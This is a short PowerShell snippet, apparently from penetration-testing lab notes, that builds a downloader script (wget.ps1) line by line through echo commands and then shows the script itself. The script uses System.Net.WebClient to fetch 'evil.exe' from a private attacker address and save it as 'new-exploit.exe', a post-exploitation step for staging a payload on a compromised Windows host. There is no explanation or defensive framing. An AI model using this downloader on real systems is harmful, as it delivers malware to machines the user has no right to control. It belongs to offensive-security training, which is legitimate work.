# echo $webclient = New-Object System.Net.WebClient >>wget.ps1
# echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
# echo $file = "new-exploit.exe" >>wget.ps1
# echo $webclient.DownloadFile($url,$file) >>wget.ps1

$webclient = New-Object System.Net.WebClient
$url = "http://10.11.11.4/evil.exe"
$file = "new-exploit.exe"
$webclient.DownloadFile($url,$file)